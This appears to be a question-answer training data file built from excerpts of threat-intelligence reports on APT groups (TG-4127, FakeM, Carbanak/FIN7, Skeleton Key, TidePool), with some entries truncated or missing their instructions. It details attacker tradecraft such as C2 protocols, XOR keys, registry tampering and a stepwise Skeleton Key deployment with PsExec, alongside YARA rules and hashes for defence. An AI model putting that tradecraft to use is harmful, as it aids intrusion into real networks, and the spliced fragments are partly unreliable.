    "instruction": "Medium Headline: Welcome to the latest issue of the ESET APT Activity Report!\nThis report summarizes the activities of selected advanced persistent threat (APT) groups that were observed, investigated, and analyzed by ESET researchers from April 2023 until the end of September 2023. In the monitored timespan, we observed a notable strategy of APT groups utilizing the exploitation of known vulnerabilities to exfiltrate data from governmental entities or related organizations. Russia-aligned Sednit and Sandworm, North Korea-aligned Konni, and geographically unattributed Winter Vivern and Sturgeon Phisher seized the opportunity to exploit vulnerabilities in WinRAR (Sednit, SturgeonPhisher, and Konni), Roundcube (Sednit and Winter Vivern), Zimbra (Winter Vivern), and Outlook for Windows (Sednit) to target various governmental organizations in Ukraine, Europe, and Central Asia. Regarding China-aligned threat actors, GALLIUM probably exploited weaknesses in Microsoft Exchange servers or IIS servers, extending its targeting from telecommunications operators to government organizations around the world; MirrorFace probably exploited vulnerabilities in the Proself online storage service; and TA410 probably exploited flaws in the Adobe ColdFusion application server.\nIran- and Middle East-aligned groups continued to operate at high volume, primarily focusing on espionage and data theft from organizations in Israel. Notably, Iran-aligned MuddyWater also targeted\nan unidentified entity in Saudi Arabia, deploying a payload that suggests the possibility of this threat actor serving as an access development team for a more advanced group.\nThe prime target of Russia-aligned groups remained Ukraine, where we discovered new versions of the known wipers RoarBat and NikoWiper, and a new wiper we named SharpNikoWiper, all deployed by Sandworm. Interestingly, while other groups \u2013 such as Gamaredon, GREF, and SturgeonPhisher \u2013 target Telegram users to try to exfiltrate information or at least some Telegram-related metadata, Sandworm uses this service for active measure purposes, advertising its cyber-sabotage operations. However, Gamaredon remained the most active group in Ukraine, significantly enhancing its data-collecting capabilities by redeveloping existing tools and deploying new ones.\nNorth Korea-aligned groups continued to focus on Japan, South Korea, and South Korea-focused entities, employing carefully crafted spearphishing emails. The most active Lazarus scheme observed was Operation DreamJob, luring targets with fake job offers for lucrative positions. This group consistently demonstrated its capability to create malware for all major desktop platforms. Finally, our researchers uncovered the operations of three previously unidentified China-aligned\ngroups: DigitalRecyclers, repeatedly compromising a governmental organization in the EU; TheWizards, conducting adversary-in-the-middle attacks; and PerplexedGoblin, targeting another government organization in the EU.\nESET APT Activity Reports contain only a fraction of the cybersecurity intelligence data provided to customers of ESET's private APT reports.

    "instruction": "Big Headline: Spearphishing details\nThe short links in the spearphishing emails redirected victims to a TG-4127-controlled URL that spoofed a legitimate Google domain. A Base64-encoded string containing the victim's full email address is passed with this URL, prepopulating a fake Google login page displayed to the victim. If a victim enters their credentials, TG-4127 can establish a session with Google and access the victim's account. The threat actors may be able to keep this session alive and maintain persistent access.\nMedium Headline: Hillary for America\nThe Hillary for America presidential campaign owns the hillaryclinton.com domain, which is used for the campaign website (www.hillaryclinton.com) and for email addresses used by campaign staff. An examination of the hillaryclinton.com DNS records shows that the domain's MX records, which indicate the mail server used by the domain, point to aspmx.l.google.com, the mail server used by (<https://support.google.com/a/answer/33915?hl=en>)Google Apps. Google Apps allows organizations to use Gmail as their organizational mail solution.\nTG-4127 exploited the Hillary for America campaign's use of Gmail and leveraged campaign employees' expectation of the standard Gmail login page to access their email account. When presented with TG-4127's spoofed login page (see Figure 1), victims might be convinced it was the legitimate login page for their hillaryclinton.com email account.\nFigure 1. Example of a TG-4127 fake Google Account login page. (Source: www.phishtank.com)\nCTU researchers observed the first short links targeting hillaryclinton.com email addresses being created in mid-March 2016; the last link was created in mid-May. During this period, TG-4127 created 213 short links targeting 108 email addresses on the hillaryclinton.com domain. Through open-source research, CTU researchers identified the owners of 66 of the targeted email addresses. There was no open-source footprint for the remaining 42 addresses, suggesting that TG-4127 acquired them from another source, possibly other intelligence activity.\nThe identified email owners held a wide range of responsibilities within the Hillary for America campaign, extending from senior figures to junior employees and the group mailboxes for various regional offices. Targeted senior figures managed communications and media affairs, policy, speech writing, finance, and travel, while junior figures arranged schedules and travel for Hillary Clinton's campaign trail. Targets held the following titles:\nNational political director\nFinance director\nDirector of strategic communications\nDirector of scheduling\nDirector of travel\nTraveling press secretary\nTravel coordinator\nPublicly available Bitly data reveals how many of the short links were clicked, likely by a victim opening a spearphishing email and clicking the link to the fake Gmail login page. Only 20 of the 213 short links have been clicked as of this publication. Eleven of the links were clicked once, four were clicked twice, two were clicked three times, and two were clicked four times.\nMedium Headline: Democratic National Committee\nThe U.S. Democratic party's governing body, the Democratic National Committee (DNC), uses the dnc.org domain for its staff email. Between mid-March and mid-April 2016, TG-4127 created 16 short links targeting nine dnc.org email accounts. CTU researchers identified the owners of three of these accounts; two belonged to the DNC's secretary emeritus, and one belonged to the communications director. Four of the 16 short links were clicked, three by the senior staff members. As of this publication, dnc.org does not use the Google Apps Gmail email service. However, because dnc.org email accounts were targeted in the same way as hillaryclinton.com accounts, it is likely that dnc.org did use Gmail at that time and later moved to a different service.\nCTU researchers do not have evidence that these spearphishing emails are connected to the DNC network compromise that was (<http://edition.cnn.com/2016/06/14/politics/democratic-national-committee-breach-russians-donald-trump/>)revealed on June 14. However, a coincidence seems unlikely, and CTU researchers suspect that TG-4127 used the spearphishing emails or similar techniques to gain an initial foothold in the DNC network.\nMedium Headline: Personal email accounts\nCTU researchers identified TG-4127 targeting 26 personal gmail.com accounts belonging to individuals linked to the Hillary for America campaign, the DNC, or other aspects of U.S. national politics. Five of the individuals also had a hillaryclinton.com email account that was targeted by TG-4127. Many of these individuals held communications, media, finance, or policy roles. They include the director of speechwriting for Hillary for America and the deputy director office of the chair at the DNC. TG-4127 created 150 short links targeting this group. As of this publication, 40 of the links have been clicked at least once.\nBig Headline: Related activity and implications\nAlthough the 2015 campaign did not focus on individuals associated with U.S. politics, open-source (<http://blog.trendmicro.com/trendlabs-security-intelligence/operation-pawn-storm-ramps-up-its-activities-targets-nato-white-house/>)evidence suggests that TG-4127 targeted individuals connected to the U.S. White House in early 2015. The threat group also (<http://www.bbc.co.uk/news/technology-36284447>)reportedly targeted the German parliament and German Chancellor Angela Merkel's Christian Democratic Union party. CTU researchers have not observed TG-4127 use this technique (using Bitly short links) to target the U.S. Republican party or the other U.S. presidential candidates whose campaigns were active between mid-March and mid-May: Donald Trump, Bernie Sanders, Ted Cruz, Marco Rubio, and John Kasich. However, the following email domains do not use Google mail servers and may have been targeted by other means:\ngop.com \u2014 used by the Republican National Committee\ndonaldjtrump.com \u2014 used by the Donald Trump campaign\njohnkasich.com \u2014 used by the John Kasich campaign\nAccess to targets' Google accounts allows TG-4127 to review internal emails and potentially access other Google Apps services used by these organizations, such as Google Drive. In addition to the value of the intelligence, the threat actors could also exploit this access for other malicious activity, such as generating spearphishing emails from internal email addresses to compromise the organizations' networks with malware.\nThe Russian government views the U.S. as a strategic rival and is known to task its intelligence agencies with gathering confidential information about individuals and organizations close to the center of power in the U.S. Individuals working for the Hillary for America campaign could have information about proposed policies for a Clinton presidency, including foreign-policy positions, which would be valuable to the Russian government. Information about travel plans and campaign scheduling could provide short-term opportunities for other intelligence operations. Long-term access to email accounts of senior campaign advisors, who may be appointed to staff positions in a Clinton administration, could provide TG-4127 and the Russian government with access to those individual's accounts.\nBig Headline: Conclusion\nWhile TG-4127 continues to primarily threaten organizations and individuals operating in Russia and former Soviet states, this campaign illustrates its willingness to expand its scope to other targets that have intelligence of interest to the Russian government. Non-governmental political organizations may provide access to desirable national policy information, especially foreign policy, but may not have the same level of protection and security as governmental organizations. Targeting individuals linked to presidential campaigns could represent an intelligence 'long game,' as establishing access to potential U.S. administration staff before they are appointed could be easier than targeting them when they are established in the White House. Access to an individual's personal or corporate email account provides a substantial amount of useful intelligence, and threat actors could also leverage the access to launch additional attacks to penetrate the network of an associated organization.\nUsers rarely check the full URL associated with short links, so threat groups can use URL-shortening services to effectively hide malicious URLs. Threat actors can use the services' detailed statistics about which links were clicked when, and from what location, to track the success of a spearphishing campaign. A single compromised account could allow TG-4127 to achieve its operational goals. CTU researchers recommend that clients take appropriate precautions to minimize the risk of these types of attacks:\nEducate users about the risks of spearphishing emails.\nUse caution and exercise due diligence when faced with a shortened link, especially in unsolicited email messages. Pasting Bitly URLs, appended with a plus sign, into the address bar of a web browser reveals the full URL.\nFor clients using Gmail as a corporate mail solution, educate users about the risk of spoofed login pages and encourage them to confirm they are on the legitimate Google Accounts page when presented with a Google\nlogin prompt.\n\nBased on the above text, answer a question. What methods did TG-4127 use to target specific individuals within the Hillary for America campaign, and how did they acquire email addresses that had no open-source footprint?",
    "output": "TG-4127 targeted specific individuals within the Hillary for America campaign by creating short links that directed victims to a fake Google login page. They targeted a wide range of responsibilities, from senior figures to junior employees, including national political directors, finance directors, and directors of strategic communications.

    "instruction": "Medium Headline: Evolving FakeM: Variants\nSince being originally exposed in 2013, authors of FakeM have continuously made changes to the FakeM codebase, resulting in multiple variants. Before elaborating on the different variants of FakeM, there are many similarities that remain throughout the various iterations. The architecture has not changed during the evolution of FakeM, as a modular framework exists in each variant, as seen in Figure 8. The FakeM main module is responsible for launching embedded modules, such as a keylogger or for gathering sensitive files. The main module is also responsible for communicating with its C2 servers and handling commands issued by the C2 server.\nAll FakeM variants initiate communications with its C2 server and check the C2's response for a\ncommand. Also, all FakeM variants share a common command handler with the same capabilities, as seen in Table 2. The limited command set suggests that FakeM's functionality is obtained by additional assembly code provided by the C2 server with the 0x211 command. According to Trend Micro's initial analysis on FakeM, threat actors delivered and ran additional code that provided further capabilities to the Trojan, such as the ability to run shell commands, steal passwords, capture the screen and upload files.\nCommandDescription0x212Idle. Attempts to receive another command immediately instead of sleeping for 30 seconds.0x213Sets a flag to end the session with the C2. This will force the Trojan to reestablish a session with the C2.0x214Exit process.\nTable 2: Command handler within all variants of FakeM\nNow that we have covered the commonalities between FakeM variants, the following sections will dive into the specific variants of FakeM. Unit 42 categorizes the different variations of FakeM based on the method used to communicate with the C2 server, which has changed dramatically over the years.\nOriginal FakeM\nThe original variant of FakeM generates network beacons to its C2 server that begin with a 32\u00adbyte header that in most cases is meant to blend into network traffic generated by legitimate applications. Following this 32\u00adbyte header, the original variant of FakeM includes data encrypted using a custom encryption cipher that uses an XOR key of \"YHCRA\" and bit rotation between each XOR operation.\nThe original variant includes the FakeM discovered and published by Trend Micro in 2013, in which the authors of FakeM first attempted to evade detection of its C2 communications by pretending to be generated by legitimate messenger applications, such as MSN and Yahoo! messengers. Figures 9 and 10 show FakeM attempting to resemble MSN or Yahoo! Messenger traffic, as the first 32\u00adbytes contain data that resemble legitimate traffic generated by these chat programs.\nIn addition to emulating chat programs, FakeM has also included HTML code within the 32\u00adbyte header. As you can see in Figure 11, the overall structure of the beacon did not change, rather the only differences is the data in the header contains HTML tags. The HTML data in the header led Unit 42 to a published by Malware.lu that suggested the MSN, Yahoo, and HTML versions of the original variant of FakeM all share a common server application that the threat actors use to build samples and control infected systems.\nIn October 2013, FireEye published a about a sample of FakeM that did not use fake messenger or HTML data in the first 32 bytes of the C2 traffic, but instead used four repeating bytes to fill this portion of the packet, as seen in Figure 12. Unit 42 tracks this under the original variant, as it uses the same algorithm to encrypt the data and otherwise shares a common structure to the MSN,\nYahoo, and HTML versions with the exception of the modification to the first 32 bytes.\nFakeM SSL\nWhile performing infrastructure analysis on FakeM original variants, we came across shared infrastructure with domains that hosted C2 servers for malware samples that did not match the known FakeM communication protocols. Palo Alto Networks WildFire had analyzed many samples associated with these related C2 domains, all of which communicated with the C2 server using secure sockets layer (SSL). To determine the malware family that was generating this traffic, Unit 42 analyzed these samples and found that the functional code was the same as the original FakeM variant.\nThis discovery indicates the authors of FakeM introduced new code to the Trojan in order to use SSL to communicate with its C2 server. The drastic change in C2 channel warranted a new variant name, and we dubbed it \"FakeM SSL\". During the analysis of these samples we did not find any operational\nC2 servers to complete a handshake to establish a SSL session. During the handshake, the FakeM SSL samples will tell the server it supports 36 different cipher suites even though the samples appear to only support one. Unit 42 believes the cipher suite within the FakeM SSL variants uses Diffie\u00adHellman for key exchange and the RC4 cipher to encrypt the C2 communications.\nFakeM Custom SSL\nIn July 2015, Scarlet Mimic delivered a spear\u00adphishing email to a branch of the Russian government with intentions of installing a payload that was undetected by any antivirus vendors on VirusTotal. The high profile target and the lack of antivirus detection prompted Unit 42 to perform an in\u00addepth analysis and found that it is yet another new variant of the FakeM Trojan. We also named this variant after it's communication protocol (FakeM Custom SSL.)\nThis new variant of FakeM shared the same functional code as its predecessors, but again the communications with the C2 dramatically differed from the other variants. Communications between this variant and the C2 server leverage what Unit 42 believes is modified SSL code, as the code is very similar to the FakeM SSL variant. The code appears to use Diffie\u00adHellman for key exchange and the RC4 algorithm like FakeM SSL; however, the initial packet sent to the C2 server did not contain a \"client hello\" message, which is required to initiate an SSL handshake. Instead, the initial packet sent data as seen in Figure 13.\nThis variant of FakeM skips the traditional SSL handshake, which involves an agreement on a cipher suite to use to encrypt communications. The FakeM code only supports one cipher suite, which makes the cipher suite agreement portion of the SSL handshake irrelevant. Instead, FakeM creates a session with its C2 server by exchanging keys. The lack of a valid handshake makes detection of this C2 stream difficult, as the packets sent between the Trojan and the C2 to establish this session contain random binary data. Network devices will also be unable to perform any SSL decryption due to the lack of detection and the inability to determine the cipher suite used to encrypt the data. Figure 14 below provides a visual depiction of the handshake procedure and the subsequent beacon and command messages.\nThe handshake starts with a key exchange, which the Trojan initiates by creating a 2048\u00adbyte buffer that it will store its key (128\u00adbytes, followed by null values as seen in Figure 13) and sending its key to the C2 server. The C2 will respond with its own key (also 128\u00adbytes, followed by null values) that the Trojan will store and use to encrypt future communications.\nOnce this key exchange is complete, the Trojan acknowledges the receipt of the server's key by sending another 2048\u00adbyte packet to the server. To build the acknowledgement packet, the Trojan creates a 2048\u00adbyte buffer filled with null values and copies the string \"ws32.dll\" to offset 8 and encrypts the buffer with the server's key.\nAfter sending the acknowledgement packet, the Trojan will gather local system information and include it in a beacon to the C2 server. Like the packets sent in the key exchange, the beacon sent by the Trojan to the C2 server is 2048\u00adbytes in length; however, the system information gathered by the Trojan is only 296 bytes followed by 1752 are null values to fill the 2048 byte buffer. The system information follows the 296\u00adbyte structure seen below:\n1 2\n3 4 5 6 7 8 9 struct beaconToC2 {\nDWORD static_value_130h;\nCHAR username[128];\nCHAR computername[128];\nDWORD static_value_70000h;\nDWORD os_codepage;\nDWORD campaign_code_1;\nDWORD campaign_code_2;\n};\nThe Trojan will encrypt this data using the key provided by the C2 and send it to the server. The Trojan will then wait for the C2 to respond, which it will decrypt and parse for FakeM commands. Unit 42 has been unable extract any plug\u00adins from C2 network traffic; however, several FakeM custom SSL samples contain embedded plug\u00adins that run without interaction with the C2 server. Also, Unit 42 was able to extract several modules from the original FakeM server application, as seen in Table 3. All of these modules are shellcode\u00adbased plug\u00adins that would work with the custom SSL variant of FakeM with little to no modification.\nRelated to FakeM Original: CallMe\nCallMe is a Trojan designed to run on the Apple OSX operating system. This Trojan was delivered in targeted attacks on Uyghur activists in 2013 and used infrastructure associated with FakeM.\nIn February 2013, on the CallMe Trojan and found that it is based on a tool called Tiny SHell, an OSX shell tool whose source code is available on the Internet.

These include both known Lazarus group tools, as well as a rare ransomware variant called 'Hermes' which may have been used as a distraction or cover-up for the security team whilst the heist was occurring.\nThe timeline below provides an overview of the key events:\nLittle information is available at present about when or how the attackers compromised the bank, but it is likely more details will emerge in the coming weeks. This blogpost seeks to summarise what is in the public domain at the moment, as well as analyse the samples uploaded to malware repositories.\n\nBased on the above text, answer a question. How did the Lazarus group leverage the Hermes ransomware during the cyber-enabled bank heist at Far Eastern International Bank (FEIB)? What strategic purpose might this serve in the context of a sophisticated financial attack?",
    "output": "The Lazarus group utilized the Hermes ransomware as a distraction or cover-up tactic during the cyber-enabled bank heist at Far Eastern International Bank (FEIB). By deploying the ransomware, the attackers aimed to divert the attention of the bank's security team away from the primary objective of transferring funds to multiple overseas beneficiaries. This strategy allowed the attackers to exploit the bank's system connected to the SWIFT network without immediate detection, thereby increasing the likelihood of successfully executing the financial theft.",

    "instruction": "Small Headline: 2.1.4. Linux and Other Tools\nCarbanak/FIN7 operators are not confined to a compromised organization's Windows environment. While their goal is generally the Windows-based machines, certain sub-groups are rather adept in the Linux world and have used specialized tools to migrate from one to the other, as well as to maintain persistence. The following SOCKS5 proxy tool is a strong example.\nThe utility begins as a daemon and connects to 95.215.36[.]116 over TCP port 443. These values, as well as credentials, are hardcoded into the malware and not obfuscated in any way (Figure 27).\nThe credentials are read from these locations, combined with sprintf() '%s:%s' and base64 encoded to create the Authorization-Basic string (Figures 28 and 29).\nThe SOCKS5 proxy obfuscates its traffic with a simple XOR loop. The same key is also used in another one of their Windows IP forwarding tools, discussed later (Figure 30).\nThis Linux SOCKS5 proxy may be found with this YARA rule:\nA similar Windows utility, \"svcmd.exe\", was discovered as well.\nCarbanak/FIN7 Windows IP Proxy Tool\nFile Name:  svcmd.exe\nFile Size:  47104 bytes\nMD5:  8b3a91038ecb2f57de5bbd29848b6dc4\nSHA1:   54074b3934955d4121d1a01fe2ed5493c3f7f16d\nPE Time:  0x58CBC258 [Fri Mar 17 11:02:48 2017 UTC]\nPEID Sig:   Microsoft Visual C++ 8\nSections (5):\nName  Entropy  MD5\n.text   6.57   80dd3bd472624a01e5dff9e015ed74fd\n.rdata  5.44   b789b368b21d3d99504e6eb11a6d6111\n.data   2.31   970056273f112900c81725137f9f8b45\n.rsrc   5.1  44a70bdd3dc9af38103d562d29023882\n.reloc  4.4  c99c03a1ef6bc783bb6e534476e5155b\nThis tool also has its configuration hardcoded into the malware and is plainly visible in its strings (Figure 31).\nInstead of a SOCKS5 proxy, this tool appears to directly forward packets to the IP address 185.86.151[.]174 on TCP port 443. It also uses a simple XOR obfuscation routine with the key of 0x41, the same as the Linux SOCKS5 proxy (Figure 32).\nYARA Signature for Windows IP Proxy Tool\nrule Carbanak_IP_Proxy\n{\nmeta:\nauthor   = \"RSA FW\"\nstrings:\n$mz  = { 4D 5A }\n$decoder  = { 33 C0 EB 03 [0-3] 80 34 38 41 40 3B C6 75 F7 }  condition:\n$mz at 0 and $decoder\n}\nThe syndicate also utilizes several freely available reconnaissance, lateral movement and privilege escalation tools, not to mention various Track data memory scrapers and other financial data-gathering utilities discovered in the wild. The table below enumerates the most common tools utilized by these actors.\nBig Headline: 3. ANUNAK HISTORICAL OVERVIEW\nThe following figures were compiled from Anunak/Sekur samples acquired from . They were initially sorted by compile time, but this proved problematic as many had compile times zeroed out (resulting in a compile date of January 1, 1970) or were tampered with to infer future compile date. Consequently, the samples were sorted by first submission to VirusTotal. The Trojans were often hardcoded with domains and IP addresses with a port. New indicators appear on the graph next to their submission date. Please note that no pDNS for the domains was added to the timeline due to the compile time vs. submission time irregularities.\nWhile there are many overlaps in infrastructure between 2014 (Figure 33) into early 2015, the 2015 period (Figure 34) shows a dramatic slowdown in the group's activity. It is noteworthy that the group was responsible for stealing millions, if not billions, from banks during 2013 and 2014. Several months later, the authorities made high-profile arrests on charges of  and . The observed lull in the group's activity following this attribution and related arrests indicates that some of the more prolific actors were either caught, ceased their activity, moved on, or changed their TTPs and continued operations.\nWhile each of these options is a possible truth, RSA Research believes that the 2015 curtailment of activity reflects Carbanak operators, still reeling from a law enforcement takedown, reorganizing into a more loosely affiliated syndicate. As mentioned previously, the graph shows net-new infrastructure, and it's worth it to note that in 2014 there were many different samples that communicated with overlapping domains and IP addresses. The immense slowdown in 2015 in new indicators, and the fact that the samples observed stopped reusing or overlapping domains and IPs, suggest a fragmentation\u2014especially considering that 2016 shows very little intersection of domains and IPs.\nThe 2016 period (Figure 35) shows an uptick in activity that included both reused and new malware. This led us to believe the reorganized Carbanak syndicate recruited new members, falling back on previously successful methods to exploit victim networks after gaining a foothold. This aligns with RSA Incident Response team's field experience, where actors using these same tactics and tools were found to be using custom or completely different Trojans than Carberp and Anunak/Sekur, post 2015.\nThe 2017 time period (Figure 36), while not yet over, is relatively sparse compared to previous years, possibly indicating this malware is at the end of its lifecycle. It is likely, given the history, some remnants of it will be recycled into another implant in the future.\nBig Headline: 4. OVERLAP WITH COMMON CRIMEWARE CAMPAIGNS\nDuring RSA Research's analysis, an interesting link emerged to several crimeware campaigns. This made sense, considering the prolific use of banker Trojans and other information-stealing Trojans by these groups. The Anunak/Sekur malware is the only unique family attributed to these groups. The rest are common, repurposed malware. By pivoting on the known infrastructure with respect to when the Trojans were active, RSA Research was able to discover a potential overlap.\nMedium Headline: Linked Sample\nFile Name:  face85f789faec82197703e296bd0c872f621902624b34c 108f0460bc687ab70.exe\nFILE SIZE:  204800 BYTES\nMD5:  1E47E12D11580E935878B0ED78D2294F\nSHA1:   8230E932427BFD4C2494A6E0269056535B9E6604\nPE TIME:  0X534BD7C7 [MON APR 14 12:42:47 2014 UTC]\nPEID SIG:   MICROSOFT VISUAL C++ 8\nSECTIONS (5):\nThe compile time of this sample does not appear to be tampered with. It was submitted to VirusTotal on August 25, 2014, from Russia via a web submission as \"great1404_chelnok.exe.\" The web submission, as well as a non-hash filename, suggests this was from the victim and not a researcher. This would give the actor a possible dwell time of over four months, more than enough time to accomplish their goals.\nUpon further analysis, we determined the Trojan is Anunak and is hardcoded to use the HTTP C2 communications method with the domain nyugorta.com (Figure 37).\nThe domain resolved to 89.45.14[.]207 on February 2nd, 2014.  Pivoting on this IP address led our research to a domain, brazilian-love[.]org, that resolved to this IP between April 8th, 2014 and December 5th, 2014.  This fit within our actor's timeframe of April to August 2014.  The WHOIS information indicated that drake.lampado777@gmail.com registered this domain and 34 others in the same timeframe.  Our research indicates \"Drake Lampado\" is a pseudonym.\nResearch into these domains revealed that many of them were involved with common Crimeware campaigns, overlapping with some of the Hosting provider subnets used by Carbanak/Fin7 during the same time (Table 2). Note: the full, unobscured table is available in the Appendix.\nThe linked IP address, 91.194.254[.]207, is registered to dimeline.eu, a European sports betting site that owns the entire 91.194.254[.]0/23 address space (Table 3).\nAs noted above, many of the samples analyzed also had domains resolving to this network space (91.194.254/23) during the 2014-2015 time period. Table 4 details the dimeline.eu IP addresses of these domains.  These domains are often referred to as lookalike domains as they are registered in such a way as to mimic other trusted or innocent domains in an attempt to go unnoticed.\nThere is also a link to a Corebot campaign with attempts to sell Corebot source code on btcshop.cc by a user named btcshop. This person claimed to be selling the Corebot source code, but was not the author, and linked to a google+ account for a Drake Lampado. A single post by this person was posted on October 11, 2013. An article explaining the link is .\nThese indirect links are not a smoking gun and may be coincidental. The Dimeline network may have been vulnerable with many different groups/ actors using its infrastructure to host their malware. Differences in TTP also exist. For example, the Carbanak/FIN7 group used more than one of their external IP addresses to host C2 applications, while we were only able to verify a single IP address hosting Corebot by the Drake Lampado actor.\nThat being said, it remains a possibility that the Carbanak/FIN7 actors run side campaigns, in addition to their APT-style attacks, on the industrial verticals dealing with financial information of interest.\n\nBased on the above text, answer a question. What methods does the Carbanak/FIN7 group use to hide their activities, particularly in terms of obfuscating traffic and hardcoding configurations?",
    "output": "The Carbanak/FIN7 group employs several methods to hide their activities. For instance, they use a SOCKS5 proxy tool on Linux that obfuscates its traffic with a simple XOR loop. This same key is also used in a Windows IP forwarding tool. Both tools have their configurations hardcoded into the malware, including IP addresses, ports, and credentials, which are not obfuscated. The Windows tool, 'svcmd.exe', directly forwards packets to a specified IP address and uses the same XOR obfuscation routine with the key of 0x41. These methods make it challenging for defenders to detect and analyze their activities.",

    "output": "The threat actors deployed the Skeleton Key malware as a 64-bit DLL file through a multi-step process. First, they uploaded the Skeleton Key DLL file to a staging directory on a jump host within the victim's network. They then attempted to access the administrative shares on the domain controllers using a list of stolen domain administrator credentials. If the stolen credentials were invalid, they used password theft tools to extract clear text domain administrator passwords from accessible servers, domain administrators' workstations, or the targeted domain controllers. Once valid credentials were obtained, they copied the Skeleton Key DLL to C:\\\\WINDOWS\\\\system32\\\\ on the target domain controllers. Using the PsExec utility, they ran the Skeleton Key DLL remotely on the target domain controllers using the rundll32 command, with the threat actor's chosen password formatted as an NTLM password hash. After deployment, they deleted the Skeleton Key DLL file from both the domain controllers and the staging directory on the jump host. Finally, they tested for successful deployment using 'net use' commands with an AD account and the password corresponding to the configured NTLM hash.",

The packer used with Trojan.Turla is unique to the group and has not been observed being used with any other malware.\nThis custom packer, used exclusively by the Waterbug group, was used for packing various components since at least 2009. The stub included in the packed driver-based variants includes the same error code value ranges as was observed in Waterbug-specific communication code. This is a strong indication that attackers maintain Table 3. Error code messages\nthe packer in-house.\nIt was found that the FA dropper from 2009 included a non-packed driver and a packed external communication component, but the dropper from 2011 included a packed driver and a non-packed external communication component. However, for SAV, the dropper, driver, and other components were all packed using the custom packer from 2011.\nSymantec is aware of five generations of the custom packer:\n\u2022 Custom A was encountered in FA external communication component (February-December 2009)\n\u2022 Custom B, variant preA was encountered in FA dropper (January 2010)\n\u2022 Custom B, variant A was encountered in FA external communication component (June 2010)\n\u2022 Custom B, variant B was encountered in various SAV components (June 2011-May 2013) and FA driver (December 2012-January 2014)\n\u2022 Custom B, variant C encountered in SAV driver (October 2013-March 2014)\nIt is worth noting that another, somewhat simpler, packer was used for packing the Trojan.Wipbot dropper (custom dotNET used by single sample).\nVery Small Headline: Error code ranges\nMany of the Waterbug-specific subroutines present in various kernel-mode samples use constants from range 0x21590001..0x21590258 as error codes. It is interesting to note that this range corresponds to 0xDEA6FXXX.\nThe following components include code with these constants:\n\u2022 Stub of custom packer present in packed kernel-mode binaries\n\u2022 FA drivers (except for samples earlier then 2008)\n\u2022 Carbon drivers\n\u2022 SAV drivers\nSeveral samples also include a table mapping these error codes to messages.

One of these families is the \"BS2005\" malware family used by the Ke3chang actor. This motivated us to dig deeper, since we had not seen any public reporting on them since 2013. From this analysis, Unit 42 compared the code bases of the new malware family, and the BS2005 malware samples. Based on our analysis we believe this new malware, which we are calling TidePool, is an evolution of the BS2005 malware family used by the Ke3chang actor.\nUnit 42 has discovered 11 similar registry modifications that both TidePool and BS2005 employ. The registry setting that TidePool and BS2005 focuses on is:\nMedium Headline: Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEHarden -> 0\nWhen the IEHarden Value is set to 0 it disables the Internet Explorer Enhanced Security configuration, which is designed to prevent the execution of scripts, ActiveX Controls, file downloads, and the Microsoft virtual machine for HTML content. This is a technique common to both BS2005 and TidePool\nmalware.\nBelow is the routine within TidePool that modifies the IEHarden registry settings. The repetition, order, and uniqueness of the code base in this function allowed us to link TidePool back to older versions of BS2005 and Operation Ke3chang.\nCode reuse overlap also allowed us to link the various interim malware iterations between Ke3chang and TidePool together. Going over every single code overlap would be tiresome, so we'll highlight major functional similarities that allowed us to link TidePool to Operation Ke3chang. A listing of similar hashes and their compile dates can be found in the IOC section at the end of this blog. They are also divided into those that pre-date the Operation Ke3chang report and those that came after.\nWe compared 5 key samples that link TidePool to the original Operation Ke3chang malware. In order of comparison and usage we looked at:\nBS2005 Operation Ke3chang sample\n233bd004ad778b7fd816b80380c9c9bd2dba5b694863704ef37643255797b41f\n2013 post Ke3chang\n012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc\n2014 post Ke3chang\n04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05\n2014 post Ke3chang\neca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4\n2015 Current TidePool\n2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18\nStarting with a known Operation Ke3chang BS2005 sample, we focus on the C2 obfuscation. Figure 3 shows the routine for following 2 samples:\n233bd004ad778b7fd816b80380c9c9bd2dba5b694863704ef37643255797b41f 012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc\nNot only do BS2005 and TidePool share repeating registry behaviors, they also use a similar code routine to obfuscate the C2. Further analysis shows that they also share similar Base64 string handling. This routine goes back even further to MyWeb malware samples, also associated with Operation Ke3chang.\nNext we compared the codebase for setting registry keys. The code reuse displayed in Figure 4 is the sequence that sets the IEHarden registry keys and other keys used throughout TidePool and Operation Ke3chang malware.\n012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc 04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05\nThe code that handles URL beacon creation is shown in Figure 5. These functions also displayed quite a bit of code reuse.\neca724dd63cf7e98ff09094e05e4a79e9f8f2126af3a41ff5144929f8fede4b4\n012fe5fa86340a90055f7ab71e1e9989db8e7bb7594cd9c8c737c3a6231bc8cc\nFinally, we compared the following two samples.\n04db80d8da9cd927e7ee8a44bfa3b4a5a126b15d431cbe64a508d4c2e407ec05 2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18\nThese samples are quite similar when looking at the library functions used, but the most notable features they have in common are the timeline of behaviors executed. Ke3chang and TidePool both modify the IEHarden registry key, as well as the following list of keys. Setting these registry keys is unique to the Ke3chang and TidePool malware families.\nHKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Check_Associations\nHKCU\\Software\\Microsoft\\Internet Explorer\\Main\\DisableFirstRunCustomize\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\IEharden\nBig Headline: A Few Words On Attribution\nAttribution is an inexact process, however we have compiled several interesting findings which lend themselves to our conclusion that this activity and malware is related to the original Operation Ke3chang.\nStrong behavioral overlap between the TidePool malware family and malware called BS2005 utilized by Operation Ke3chang\nStrong code reuse and overlap showing a branching and evolution of malware from BS2005 to TidePool.\nTargeting and attack method matches historic Ke3chang targeting.\nWhen binaries included resources, encoding was 0x04 (LANG_CHINESE) indicating the actor's system is likely running an operating system and software with Chinese as the default display language.\nBig Headline: Conclusion\nDespite going unreported on since 2013, Operation Ke3chang has not ceased operations and in fact continued developing its malware. Unit 42 was able to track the evolution of Operation Ke3chang's tools by observing unique behavioral quirks common throughout the malware's lineage. By pivoting on these behaviors in AutoFocus, we were able to assess a relationship between these families dating back to at least 